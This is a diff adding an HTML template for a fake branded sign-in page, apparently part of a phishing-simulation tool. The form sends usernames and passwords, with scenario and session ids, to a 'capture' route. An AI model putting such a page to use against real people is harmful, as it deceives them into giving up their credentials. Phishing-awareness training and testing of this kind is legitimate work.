@@ -1,0 +1,19 @@
+{% extends 'base.html' %}
+{% block heading %}{{ scenario.brand }}{% endblock %}
+{% block content %}
+<div class="login-page">
+  <div class="login-card">
+    <div class="login-brand"><span class="login-logo">{{ scenario.icon }}</span><strong>{{ scenario.brand }}</strong></div>
+    <h2>{{ scenario.login_title }}</h2>
+    <p>{{ scenario.login_subtitle }}</p>
+    <form method="post" action="{{ url_for('capture') }}" autocomplete="off">
+      <input type="hidden" name="scenario" value="{{ scenario_key }}">
+      <input type="hidden" name="sid" value="{{ sid }}">
+      <label>Username or email<input class="input" name="username" required autocomplete="off" placeholder="Enter username or email"></label>
+      <label>Password<input class="input" name="password" type="password" required autocomplete="new-password" placeholder="Enter password"></label>
+      <button class="btn primary full" type="submit">Continue</button>
+    </form>
+    <div class="login-foot"><span>Need help signing in?</span><span>Privacy</span></div>
+  </div>
+</div>
+{% endblock %}
